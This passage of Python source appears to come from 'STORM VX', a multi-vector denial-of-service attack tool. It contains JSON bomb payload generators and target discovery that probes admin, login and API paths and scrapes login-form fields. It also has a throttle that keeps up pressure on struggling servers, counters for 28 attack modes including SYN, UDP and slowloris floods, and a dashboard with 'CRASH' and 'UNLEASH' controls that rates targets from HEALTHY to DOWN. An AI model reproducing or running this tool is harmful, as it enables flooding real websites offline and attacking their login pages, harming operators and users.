        return f'{entities}<bomb>{body}</bomb>'

    @staticmethod
    def json_bomb_payload():
        """Deeply nested JSON bomb or huge array."""
        style = random.choice(["deep", "wide", "wide_deep"])
        if style == "deep":
            depth = random.randint(30, 80)
            payload = "X"
            for i in range(depth):
                payload = json.dumps({"a": payload, "b": rs(5), "c": i})
            return payload
        elif style == "wide":
            return json.dumps({"items": [rs(50) for _ in range(5000)]})
        else:
            # Wide + deep
            depth = random.randint(10, 25)
            payload = {"data": [rs(20) for _ in range(100)]}
            for i in range(depth):
                payload = {"nested": payload, "meta": {rs(8): rs(15) for _ in range(10)}, "page": i}
            return json.dumps(payload)

    @staticmethod
    def random_url_path():
        """Generate random URL path for fuzzing."""
        segments = random.randint(2, 8)
        parts = []
        for _ in range(segments):
            parts.append(rs(random.randint(3, 12), string.ascii_lowercase + string.digits + "_-/"))
        path = "/" + "/".join(parts)
        if random.random() < 0.3:
            path += "." + random.choice(["php", "asp", "aspx", "html", "json", "xml", "do", "action", "py", "rb"])
        if random.random() < 0.4:
            path += "?" + "&".join([f"{rs(4)}={rs(6)}" for _ in range(random.randint(1, 4))])
        return path


# ═══════════════════════════════════════════════════════════════════════════════
# Discovery
# ═══════════════════════════════════════════════════════════════════════════════

class Discovery:
    PATHS = [
        "/", "/index.html", "/index.php", "/index.aspx", "/Default.aspx",
        "/Home", "/home", "/login", "/Login.aspx", "/signin",
        "/api/", "/api/v1/", "/api/v2/", "/admin", "/Admin/Default.aspx",
        "/search", "/Search.aspx", "/handler.ashx", "/WebService.asmx",
        "/robots.txt", "/sitemap.xml", "/favicon.ico",
        "/wp-login.php", "/wp-admin/", "/wp-content/", "/xmlrpc.php",
        "/graphql", "/api/graphql", "/gql",
        "/FirstPages/Default.aspx", "/FirstPages/Student.aspx",
        "/FirstPages/Teacher.aspx", "/FirstPages/Admin.aspx",
        "/api/search", "/api/users", "/api/posts", "/api/comments",
        "/export", "/download", "/upload", "/api/upload",
        "/Content/Images/bg.jpg", "/Scripts/jquery.js", "/Content/Site.css",
        "/bundles/", "/static/", "/assets/", "/dist/",
        "/ws", "/socket.io/", "/api/ws",
        "/swagger.json", "/api/docs",
    ]

    def __init__(self, base):
        self.base = base
        p = base.split('//')
        self.root = p[0] + '//' + p[1].split('/')[0] if len(p) > 1 else base
        self.pages = []
        self.resources = []
        self.heavy_pages = []
        self.heavy_resources = []
        self.login_fields = {}
        self.asp_fields = {}
        self.server_tech = []
        self.api_endpoints = []
        self._add_log = None

    def _log(self, msg, level="info"):
        if self._add_log:
            self._add_log(msg, level)

    async def run(self, sess):
        self._log("Auto-discovering target...", "info")
        html = await self._get(sess, self.base)
        if not html:
            self._log("Target is unreachable!", "error")
            return False
        self._log(f"Homepage: {len(html):,} bytes", "success")
        await self._detect_tech(sess)
        if self.server_tech:
            self._log(f"Server: {', '.join(self.server_tech)}", "info")
        self._links(html)
        await self._probe(sess)
        self._detect_login(html)
        if self.login_fields:
            self._log(f"Login form: {self.login_fields.get('u','?')} / {self.login_fields.get('p','?')}", "success")
        await self._detect_api(sess)
        await self._rank(sess)
        self._log(f"Found {len(self.pages)} pages, {len(self.resources)} resources, {len(self.api_endpoints)} APIs", "success")
        return True

    async def _get(self, sess, url):
        try:
            async with sess.get(url, headers=HF.flood(url), ssl=False,
                                timeout=aiohttp.ClientTimeout(total=10), allow_redirects=True) as r:
                return await r.text()
        except:
            return None

    async def _detect_tech(self, sess):
        try:
            async with sess.head(self.base, ssl=False, timeout=aiohttp.ClientTimeout(total=5), allow_redirects=True) as r:
                s = r.headers.get('Server', '')
                p = r.headers.get('X-Powered-By', '')
                a = r.headers.get('X-AspNet-Version', '')
                if 'nginx' in s.lower(): self.server_tech.append('Nginx')
                if 'apache' in s.lower(): self.server_tech.append('Apache')
                if 'iis' in s.lower(): self.server_tech.append('IIS')
                if 'asp.net' in p.lower() or a: self.server_tech.append('ASP.NET')
                if 'php' in p.lower(): self.server_tech.append('PHP')
                if 'express' in p.lower(): self.server_tech.append('Node.js')
                if 'next' in p.lower(): self.server_tech.append('Next.js')
                if 'django' in p.lower(): self.server_tech.append('Django')
                if self.server_tech:
                    self._log(f"Server detected: {', '.join(self.server_tech)}", "info")
        except:
            pass

    async def _detect_api(self, sess):
        api_paths = ["/graphql", "/api/graphql", "/gql", "/api/v1/users",
                     "/api/v1/posts", "/api/v1/search", "/api/v2/",
                     "/.well-known/openapi", "/swagger.json", "/api/docs"]
        async def _check_api(path):
            url = self.root + path
            try:
                async with sess.head(url, headers=HF.flood(url), ssl=False,
                                     timeout=aiohttp.ClientTimeout(total=3), allow_redirects=True) as r:
                    if r.status < 500:
                        self.api_endpoints.append(url)
            except:
                pass
        await asyncio.gather(*[_check_api(p) for p in api_paths])

    def _links(self, html):
        host = self.root.split('//')[1].split('/')[0]
        for m in re.finditer(r'href=["\']([^"\']+)["\']', html, re.I):
            l = m.group(1)
            if l.startswith('/'): l = self.root + l
            elif not l.startswith('http'): continue
            if host not in l: continue
            ext = l.rsplit('.', 1)[-1].lower() if '.' in l.split('?')[0].rsplit('/', 1)[-1] else ''
            if ext in ('jpg','jpeg','png','gif','svg','ico','webp','css','js','woff','woff2','ttf','pdf','zip'):
                if l not in self.resources: self.resources.append(l)
            elif l not in self.pages: self.pages.append(l)
        for m in re.finditer(r'src=["\']([^"\']+)["\']', html, re.I):
            l = m.group(1)
            if l.startswith('/'): l = self.root + l
            elif not l.startswith('http'): continue
            if host in l and l not in self.resources: self.resources.append(l)

    async def _probe(self, sess):
        async def _check(path):
            url = self.root + path
            if url in self.pages or url in self.resources: return
            try:
                async with sess.head(url, ssl=False, timeout=aiohttp.ClientTimeout(total=3), allow_redirects=True) as r:
                    if r.status < 400:
                        ct = r.headers.get('Content-Type', '')
                        if any(x in ct for x in ['image', 'javascript', 'css', 'font']):
                            if url not in self.resources: self.resources.append(url)
                        elif url not in self.pages: self.pages.append(url)
            except:
                pass
        # Probe in parallel batches of 10
        batch_size = 10
        for i in range(0, len(self.PATHS), batch_size):
            batch = self.PATHS[i:i+batch_size]
            await asyncio.gather(*[_check(p) for p in batch])

    def _detect_login(self, html):
        if '<form' not in html.lower(): return
        uf, pf, btn = "username", "password", ""
        for p in [r'name="(ctl00[^"]*[Uu]ser[^"]*)"', r'name="(txtUserName)"', r'name="(UserName)"', r'name="(username)"', r'name="(email)"']:
            m = re.search(p, html)
            if m: uf = m.group(1); break
        for p in [r'name="(ctl00[^"]*[Pp]ass[^"]*)"', r'name="(txtPassword)"', r'name="(Password)"', r'name="(password)"']:
            m = re.search(p, html)
            if m: pf = m.group(1); break
        for p in [r'name="(ctl00[^"]*[Bb]tn[^"]*[Ll]ogin[^"]*)"', r'name="(btnLogin)"', r'name="(btnSubmit)"', r'type="submit"[^>]*name="([^"]*)"']:
            m = re.search(p, html)
            if m: btn = m.group(1); break
        hidden = {}
        for inp in re.findall(r'<input[^>]*type="hidden"[^>]*>', html, re.I):
            nm = re.search(r'name="([^"]*)"', inp)
            vl = re.search(r'value="([^"]*)"', inp)
            if nm: hidden[nm.group(1)] = vl.group(1) if vl else ""
        self.login_fields = {"u": uf, "p": pf, "b": btn}
        self.asp_fields = hidden

    async def _rank(self, sess):
        async def _rank_page(url):
            t = time.time()
            try:
                async with sess.get(url, headers=HF.flood(url), ssl=False,
                                    timeout=aiohttp.ClientTimeout(total=8), allow_redirects=True) as r:
                    b = await r.text()
                    self.heavy_pages.append({"url": url, "sz": len(b), "rt": time.time()-t})
            except: pass
        async def _rank_res(url):
            t = time.time()
            try:
                async with sess.get(url, headers=HF.resource(), ssl=False,
                                    timeout=aiohttp.ClientTimeout(total=8), allow_redirects=True) as r:
                    d = await r.read()
                    self.heavy_resources.append({"url": url, "sz": len(d), "rt": time.time()-t})
            except: pass
        # Rank in parallel batches of 5
        for i in range(0, min(len(self.pages), 25), 5):
            batch = self.pages[i:i+5]
            await asyncio.gather(*[_rank_page(u) for u in batch])
        for i in range(0, min(len(self.resources), 15), 5):
            batch = self.resources[i:i+5]
            await asyncio.gather(*[_rank_res(u) for u in batch])
        self.heavy_pages.sort(key=lambda x: x['rt'], reverse=True)
        self.heavy_resources.sort(key=lambda x: x['sz'], reverse=True)

    def get_pages(self):
        return [p['url'] for p in self.heavy_pages] if self.heavy_pages else (self.pages[:8] or [self.base])
    def get_res(self):
        return [r['url'] for r in self.heavy_resources] if self.heavy_resources else (self.resources[:8] or [self.root + "/favicon.ico"])


# ═══════════════════════════════════════════════════════════════════════════════
# Circuit Breaker
# ═══════════════════════════════════════════════════════════════════════════════

class CB:
    def __init__(self):
        self.state = CircuitState.CLOSED
        self.fc = 0
    def ok(self): return True
    def suc(self):
        if self.state != CircuitState.CLOSED:
            self.state = CircuitState.CLOSED; self.fc = 0
    def fail(self): self.fc += 1


# ═══════════════════════════════════════════════════════════════════════════════
# Auto-Throttle
# ═══════════════════════════════════════════════════════════════════════════════

class AutoThrottle:
    def __init__(self):
        self._recent_502 = deque(maxlen=100)
        self._recent_5xx = deque(maxlen=200)
        self._recent_conn = deque(maxlen=100)
        self._capped = False
        self._cap_workers = 0
        self._last_check = time.time()

    def record(self, hr):
        now = time.time()
        if hr.code == 502 or hr.code == 503:
            self._recent_502.append(now)
        if hr.code and hr.code >= 500:
            self._recent_5xx.append(now)
        if hr.err and ("ConnErr" in hr.err or "NoConnect" in hr.err):
            self._recent_conn.append(now)

    def check(self, total_workers, recent_success_rate):
        now = time.time()
        if now - self._last_check < 2:
            return self._capped, 1.0
        self._last_check = now
        recent_502 = sum(1 for t in self._recent_502 if now - t < 10)
        recent_5xx = sum(1 for t in self._recent_5xx if now - t < 10)
        recent_conn = sum(1 for t in self._recent_conn if now - t < 10)
        if recent_502 > 20 or (recent_5xx > 50 and recent_success_rate < 20):
            if not self._capped: self._capped = True; self._cap_workers = total_workers
            return True, 0.2
        if recent_5xx > 10 or recent_success_rate < 40:
            if not self._capped: self._capped = True; self._cap_workers = total_workers
            return True, 0.5
        if recent_conn > 15:
            if not self._capped: self._capped = True; self._cap_workers = total_workers
            return True, 0.3
        if self._capped and recent_success_rate > 60 and recent_5xx < 5:
            self._capped = False
            return False, 1.5
        self._capped = False
        return False, 1.0

    @property
    def status_str(self):
        return f"CAPPED@{self._cap_workers:,}" if self._capped else "PUSHING"


# ═══════════════════════════════════════════════════════════════════════════════
# Stats
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class HR:
    ok: bool; code: Optional[int]; rt: float; mode: AttackMode = AttackMode.FLOOD
    err: Optional[str] = None; hint: str = ""; br: int = 0; bs: int = 0
    ts: float = field(default_factory=time.time); url: str = ""


@dataclass
class S:
    total: int = 0; ok_: int = 0; fail: int = 0
    tmo: int = 0; conn: int = 0; rl: int = 0; serr: int = 0
    # Batch 1 (original 8)
    flood: int = 0; slow: int = 0; spost: int = 0; rng: int = 0
    login: int = 0; login_ok: int = 0; res: int = 0; pbomb: int = 0; ssl_hk: int = 0
    # Batch 2 (L7 heavy 10)
    h2_rapid: int = 0; ws_fl: int = 0; wp_xml: int = 0; cache_st: int = 0
    api_fz: int = 0; mpart: int = 0; hdr_b: int = 0; chunk: int = 0
    sess_fl: int = 0; gql_bm: int = 0
    # Batch 3 (new 10)
    syn_fl: int = 0; udp_fl: int = 0; ck_bomb: int = 0; head_fl: int = 0
    xml_bm: int = 0; slow_rd: int = 0; conn_fl: int = 0; http10_fl: int = 0
    url_fz: int = 0; json_bm: int = 0
    # Security
    cap: int = 0; lock: int = 0; cache_b: int = 0
    first_rl: int = 0; first_cap: int = 0
    rts: List[float] = field(default_factory=list)
    codes: Dict[int, int] = field(default_factory=dict)
    errs: List[str] = field(default_factory=list)
    hints: Dict[str, int] = field(default_factory=dict)
    bw: int = 0; bw_up: int = 0
    t0: float = 0; t1: float = 0; users: int = 0; phase: int = 0
    _rec: deque = field(default_factory=lambda: deque(maxlen=200000))
    _rtw: deque = field(default_factory=lambda: deque(maxlen=100000))

    @property
    def dur(self):
        return ((self.t1 if self.t1 > self.t0 else time.time()) - self.t0) if self.t0 else 0
    @property
    def rps(self):
        return self.total / self.dur if self.dur > 0 else 0
    @property
    def rrps(self):
        n = time.time(); r = [x for x in self._rec if n - x.ts < 5]; return len(r)/5 if r else 0
    @property
    def art(self):
        return statistics.mean(self.rts) if self.rts else 0
    @property
    def rart(self):
        n = time.time(); r = [x.rt for x in self._rec if n-x.ts < 5]; return statistics.mean(r) if r else 0
    @property
    def p95(self):
        if len(self._rtw) < 5: return 0
        s = sorted(self._rtw); return s[min(int(len(s)*0.95), len(s)-1)]
    @property
    def sr(self):
        return (self.ok_/self.total*100) if self.total > 0 else 0
    @property
    def rsr(self):
        n = time.time(); r = [x for x in self._rec if n-x.ts < 5]
        return (sum(1 for x in r if x.ok)/len(r)*100) if r else 100
    @property
    def kbps(self):
        return (self.bw*8/1024/self.dur) if self.dur > 0 else 0
    @property
    def kbps_up(self):
        return (self.bw_up*8/1024/self.dur) if self.dur > 0 else 0
    @property
    def total_bandwidth(self):
        return self.bw + self.bw_up
    @property
    def attack_counts(self):
        return {
            AttackMode.FLOOD: self.flood, AttackMode.SLOWLORIS: self.slow,
            AttackMode.SLOW_POST: self.spost, AttackMode.RANGE: self.rng,
            AttackMode.LOGIN: self.login, AttackMode.RESOURCE: self.res,
            AttackMode.POST_BOMB: self.pbomb, AttackMode.SSL_FLOOD: self.ssl_hk,
            AttackMode.H2_RAPID: self.h2_rapid, AttackMode.WS_FLOOD: self.ws_fl,
            AttackMode.WP_XMLRPC: self.wp_xml, AttackMode.CACHE_STORM: self.cache_st,
            AttackMode.API_FUZZ: self.api_fz, AttackMode.MULTIPART: self.mpart,
            AttackMode.HEADER_BOMB: self.hdr_b, AttackMode.CHUNKED: self.chunk,
            AttackMode.SESSION_FLOOD: self.sess_fl, AttackMode.GQL_BOMB: self.gql_bm,
            AttackMode.SYN_FLOOD: self.syn_fl, AttackMode.UDP_FLOOD: self.udp_fl,
            AttackMode.COOKIE_BOMB: self.ck_bomb, AttackMode.HEAD_FLOOD: self.head_fl,
            AttackMode.XML_BOMB: self.xml_bm, AttackMode.SLOW_READ: self.slow_rd,
            AttackMode.CONN_FLOOD: self.conn_fl, AttackMode.HTTP10_FLOOD: self.http10_fl,
            AttackMode.URL_FUZZ: self.url_fz, AttackMode.JSON_BOMB: self.json_bm,
        }

# Mode → stat field name mapping
MODE_FIELD_MAP = {
    AttackMode.FLOOD: 'flood', AttackMode.SLOWLORIS: 'slow',
    AttackMode.SLOW_POST: 'spost', AttackMode.RANGE: 'rng',
    AttackMode.LOGIN: 'login', AttackMode.RESOURCE: 'res',
    AttackMode.POST_BOMB: 'pbomb', AttackMode.SSL_FLOOD: 'ssl_hk',
    AttackMode.H2_RAPID: 'h2_rapid', AttackMode.WS_FLOOD: 'ws_fl',
    AttackMode.WP_XMLRPC: 'wp_xml', AttackMode.CACHE_STORM: 'cache_st',
    AttackMode.API_FUZZ: 'api_fz', AttackMode.MULTIPART: 'mpart',
    AttackMode.HEADER_BOMB: 'hdr_b', AttackMode.CHUNKED: 'chunk',
    AttackMode.SESSION_FLOOD: 'sess_fl', AttackMode.GQL_BOMB: 'gql_bm',
    AttackMode.SYN_FLOOD: 'syn_fl', AttackMode.UDP_FLOOD: 'udp_fl',
    AttackMode.COOKIE_BOMB: 'ck_bomb', AttackMode.HEAD_FLOOD: 'head_fl',
    AttackMode.XML_BOMB: 'xml_bm', AttackMode.SLOW_READ: 'slow_rd',
    AttackMode.CONN_FLOOD: 'conn_fl', AttackMode.HTTP10_FLOOD: 'http10_fl',
    AttackMode.URL_FUZZ: 'url_fz', AttackMode.JSON_BOMB: 'json_bm',
}


# ═══════════════════════════════════════════════════════════════════════════════
# Log Entry
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class LogEntry:
    ts: float; level: str; msg: str; tag: str = ""


# ═══════════════════════════════════════════════════════════════════════════════
# Terminal Dashboard
# ═══════════════════════════════════════════════════════════════════════════════

class Dashboard:
    def __init__(self):
        self.logs: deque = deque(maxlen=3000)
        self.active_attacks: Set[AttackMode] = set(DEFAULT_ATTACKS)
        self.crash_mode = False
        self._screen_active = False
        self._last_render = 0

    def enter(self):
        sys.stdout.write('\033[?1049h'); sys.stdout.write('\033[?25l'); sys.stdout.flush()
        self._screen_active = True

    def leave(self):
        sys.stdout.write('\033[?25h'); sys.stdout.write('\033[?1049l'); sys.stdout.flush()
        self._screen_active = False

    def add_log(self, msg, level="info", tag="SYS"):
        self.logs.append(LogEntry(time.time(), level, msg, tag))

    def add_request_log(self, hr: HR):
        short = ATTACK_SHORT.get(hr.mode, "???")
        if hr.ok:
            if hr.code:
                code_color = C.G if hr.code < 300 else C.CY if hr.code < 400 else C.Y
                sz = fmt_bytes(hr.br) if hr.br else "-"
                msg = f"{hr.code} ({hr.rt:.2f}s, {sz})"
                if hr.url:
                    path = hr.url.split('//')[-1] if '//' in hr.url else hr.url
                    path = '/' + '/'.join(path.split('/')[1:]) if '/' in path else path
                    if len(path) > 35: path = '...' + path[-32:]
                    msg = f"{path} -> {msg}"
                self.add_log(msg, "success", short)
            else:
                self.add_log(f"OK ({hr.rt:.2f}s)", "success", short)
        else:
            if hr.code == 429:
                self.add_log("429 RATE LIMITED!", "warning", short)
            elif hr.code and hr.code >= 500:
                self.add_log(f"{hr.code} SERVER DOWN!", "error", short)
            elif hr.err == "Timeout":
                self.add_log(f"TIMEOUT ({hr.rt:.1f}s)", "error", short)
            elif hr.err == "ConnErr":
                self.add_log("CONN REFUSED", "error", short)
            elif hr.err == "SSLErr":
                self.add_log("SSL FAIL", "error", short)
            elif hr.hint and "CAPTCHA" in hr.hint.upper():
                self.add_log("CAPTCHA DETECTED!", "warning", short)
            elif hr.hint and "LOCK" in hr.hint.upper():
                self.add_log("ACCOUNT LOCKED", "warning", short)
            else:
                self.add_log(f"FAIL: {hr.err or hr.code or 'Error'}", "error", short)

    def activate_more_attacks(self, n=5):
        activated = []
        for _ in range(n):
            for attack in ATTACK_ACTIVATE_ORDER:
                if attack not in self.active_attacks:
                    self.active_attacks.add(attack)
                    activated.append(ATTACK_NAMES[attack])
                    break
        return activated

    def render(self, st: S, engine):
        if not self._screen_active: return
        now = time.time()
        if now - self._last_render < 0.3: return
        self._last_render = now
        W, H = get_terminal_size()
        lines = []

        # Header
        skull = f"{C.BD}{C.G}STORM{C.RS}"
        ver = f"{C.BD}{C.G}VX{C.RS}"
        mode_tag = f"{C.BD}{C.R}CRASH{C.RS}" if self.crash_mode else f"{C.G}NORMAL{C.RS}"
        # Resource mode tag
        if hasattr(engine, 'resman'):
            rm = engine.resman
            if rm.is_unleash:
                res_tag = f"{C.BD}{C.R}UNLEASH{C.RS}"
            elif rm.mode == rm.NORMAL:
                res_tag = f"{C.Y}NORMAL{C.RS}"
            else:
                res_tag = f"{C.G}SAFE{C.RS}"
        else:
            res_tag = f"{C.G}SAFE{C.RS}"
        th_color = C.Y if engine.throttle._capped else C.G
        header = f" {skull} {ver} | {mode_tag} | {res_tag} | {fmt_time(st.dur)} | Throttle: {th_color}{engine.throttle.status_str}{C.RS} | {C.BD}28{C.RS} Vectors"
        lines.append(self._pad(header, W))

        # Target + Resource info
        url_short = engine.url
        if len(url_short) > W - 30: url_short = '...' + url_short[-(W-33):]
        srv = ', '.join(engine.disc.server_tech) if engine.disc.server_tech else "Unknown"
        target = f" {C.CY}TARGET{C.RS} {url_short}  {C.DM}|{C.RS}  {C.Y}SERVER{C.RS} {srv}  {C.DM}|{C.RS}  {C.B}PHASE{C.RS} {st.phase}  {C.DM}|{C.RS}  {C.M}ACTIVE{C.RS} {len(self.active_attacks)}/28"
        lines.append(self._pad(target, W))

        # Resource usage line
        if hasattr(engine, 'resman'):
            rm = engine.resman
            rm.update()
            cpu_c = C.G if rm.cpu_pct < rm.cpu_limit * 0.7 else C.Y if rm.cpu_pct < rm.cpu_limit else C.R
            ram_c = C.G if rm.ram_pct < rm.ram_limit * 0.7 else C.Y if rm.ram_pct < rm.ram_limit else C.R
            cap_c = C.R if rm.is_unleash else C.G
            res_line = (f" {C.BD}SYSTEM{C.RS} {cpu_c}CPU:{rm.cpu_pct:.0f}%/{rm.cpu_limit}%{C.RS}  "
                        f"{ram_c}RAM:{rm.ram_pct:.0f}%/{rm.ram_limit}%{C.RS}({rm.ram_used_gb:.1f}/{rm.ram_total_gb:.0f}GB)  "
                        f"{C.DM}|{C.RS}  {cap_c}Cap:{rm.worker_cap:,}w{C.RS} {C.DM}|{C.RS}  "
                        f"{C.BD}Mode:{C.RS} {res_tag}")
            lines.append(self._pad(res_line, W))
        lines.append(self._pad(f"{C.DM}{'─' * min(W, 120)}{C.RS}", W))

        # Stats
        rsr = st.rsr
        rsr_color = C.G if rsr >= 70 else C.Y if rsr >= 40 else C.R
        health_bar = self._bar(rsr/100, 20, rsr_color)
        health_label = f"{C.G}HEALTHY{C.RS}" if rsr >= 70 else f"{C.Y}PRESSURED{C.RS}" if rsr >= 40 else f"{C.R}COLLAPSING{C.RS}" if rsr >= 20 else f"{C.BD}{C.R}DOWN{C.RS}"
        art = st.rart
        art_color = C.G if art < 1 else C.Y if art < 3 else C.R

        row4 = (f" {C.BD}Workers{C.RS} {C.W}{st.users:,}{C.RS}  {C.DM}|{C.RS}  "
                f"{C.BD}Requests{C.RS} {C.W}{st.total:,}{C.RS}  {C.DM}|{C.RS}  "
                f"{C.G}OK{C.RS} {C.G}{st.ok_:,}{C.RS}  {C.R}FAIL{C.RS} {C.R}{st.fail:,}{C.RS}  {C.DM}|{C.RS}  "
                f"{C.BD}RPS{C.RS} {C.W}{st.rrps:.0f}/s{C.RS}")
        lines.append(self._pad(row4, W))
        row5 = (f" {health_label} {health_bar} {rsr_color}{rsr:.0f}%{C.RS}  {C.DM}|{C.RS}  "
                f"{C.BD}Latency{C.RS} {art_color}{art:.2f}s{C.RS} (p95:{st.p95:.2f}s)  {C.DM}|{C.RS}  "
                f"{C.BD}Step{C.RS} {C.W}{engine.step}{C.RS}")
        lines.append(self._pad(row5, W))
        lines.append(self._pad(f"{C.DM}{'─' * min(W, 120)}{C.RS}", W))

        # Attack Vectors (compact: 4 per row)
        lines.append(self._pad(f" {C.BD}ATTACK VECTORS (28){C.RS}", W))
        ac = st.attack_counts
        tot = max(sum(ac.values()), 1)
        attack_list = [m for m in AttackMode if m != AttackMode.CRASH]
        line_parts = []
        for i, mode in enumerate(attack_list):
            cnt = ac[mode]
            active = mode in self.active_attacks
            tag = "ON " if active else "OFF"
            tag_c = C.G if active else C.DM
            color = ATTACK_COLORS.get(mode, C.W)
            name = ATTACK_NAMES[mode]
            part = f"[{tag_c}{tag}{C.RS}]{color}{name:11s}{C.RS}{C.W}{cnt:>4,}{C.RS}"
            line_parts.append(part)
            if (i + 1) % 4 == 0 or i == len(attack_list) - 1:
                lines.append(self._pad(" ".join(line_parts), W))
                line_parts = []

        lines.append(self._pad(f"{C.DM}{'─' * min(W, 120)}{C.RS}", W))

        # Bandwidth & Security
        bw_dl = fmt_bits(st.bw / st.dur) if st.dur > 0 else "0 bps"
        bw_ul = fmt_bits(st.bw_up / st.dur) if st.dur > 0 else "0 bps"
        row_bw = (f" {C.BD}BANDWIDTH{C.RS}  {C.CY}DL{C.RS}:{fmt_bytes(st.bw)}({bw_dl})  "
                  f"{C.M}UL{C.RS}:{fmt_bytes(st.bw_up)}({bw_ul})  {C.W}Total{C.RS}:{fmt_bytes(st.total_bandwidth)}  "
                  f"{C.DM}|{C.RS}  {C.BD}CacheBusted{C.RS}:{C.CY}{st.cache_b:,}{C.RS}")
        lines.append(self._pad(row_bw, W))

        rl_status = f"{C.G}ACTIVE{C.RS}(#{st.first_rl:,})" if st.rl > 0 else f"{C.R}NONE{C.RS}"
        cap_status = f"{C.G}ACTIVE{C.RS}(#{st.first_cap:,})" if st.cap > 0 else f"{C.Y}NONE{C.RS}"
        row_sec = (f" {C.BD}SECURITY{C.RS}  RL:{rl_status}  CAPTCHA:{cap_status}  "
                   f"Lock:{C.R if st.lock else C.DM}{st.lock:,}{C.RS}  "
                   f"5xx:{C.R}{st.serr:,}{C.RS}  Tmo:{C.Y}{st.tmo:,}{C.RS}")
        lines.append(self._pad(row_sec, W))

        # HTTP Codes
        if st.codes:
            lines.append(self._pad(f"{C.DM}{'─' * min(W, 120)}{C.RS}", W))
            code_parts = [f" {C.BD}CODES{C.RS}"]
            for code, cnt in sorted(st.codes.items()):
                if cnt / max(st.total, 1) < 0.005: continue
                ic = C.G if 200 <= code < 300 else C.CY if 300 <= code < 400 else C.Y if 400 <= code < 500 else C.R
                code_parts.append(f" {ic}{code}{C.RS}:{cnt:,}")
            lines.append(self._pad(" ".join(code_parts), W))

        # Console
        lines.append(self._pad(f"{C.DM}{'─' * min(W, 120)}{C.RS}", W))
        lines.append(self._pad(f" {C.BD}LIVE CONSOLE{C.RS}", W))
        used_rows = len(lines) + 2
        log_rows = max(H - used_rows - 1, 5)
        for entry in list(self.logs)[-log_rows:]:
            ts_str = time.strftime("%H:%M:%S", time.localtime(entry.ts))
            level_colors = {"info": C.CY, "success": C.G, "warning": C.Y, "error": C.R, "request": C.W, "bright": C.BD + C.W}
            c = level_colors.get(entry.level, C.W)
            tag_c = C.DM
            for mode in AttackMode:
                if ATTACK_SHORT.get(mode) == entry.tag:
                    tag_c = ATTACK_COLORS.get(mode, C.DM); break
            tag_str = f"{tag_c}{entry.tag:4s}{C.RS}" if entry.tag else "    "
            lines.append(self._truncate(f" {C.DM}{ts_str}{C.RS} [{tag_str}] {c}{entry.msg}{C.RS}", W))

        # Controls
        lines.append(self._pad(f"{C.DM}{'─' * min(W, 120)}{C.RS}", W))
        controls = (f" {C.BD}CTRL{C.RS}  {C.G}[+]{C.RS} +1000W  {C.Y}[-]{C.RS} -Step  "
                    f"{C.R}[q]{C.RS} Stop  {C.CY}[p]{C.RS} +5Atks  {C.BD}[a]{C.RS} AllON  "
                    f"{C.BD}[c]{C.RS} CRASH  {C.Y}[n]{C.RS} Normal  {C.R}[x]{C.RS} UNLEASH")
        lines.append(self._pad(controls, W))

        # Clear screen and render
        output = '\033[H\033[2J' + '\n'.join(lines)
        sys.stdout.write(output)
        sys.stdout.flush()

    def _bar(self, pct, width, color):
        pct = max(0, min(1, pct))
        filled = int(pct * width); empty = width - filled
        return f"{color}{'█' * filled}{C.DM}{'░' * empty}{C.RS}"

    def _pad(self, text, width): return text

    def _truncate(self, text, width):
        visible = 0; result = []; in_escape = False
        for ch in text:
            if ch == '\033': in_escape = True; result.append(ch); continue
            if in_escape:
                result.append(ch)
                if ch == 'm': in_escape = False
                continue
            visible += 1
            if visible <= width: result.append(ch)
        return ''.join(result) + C.RS
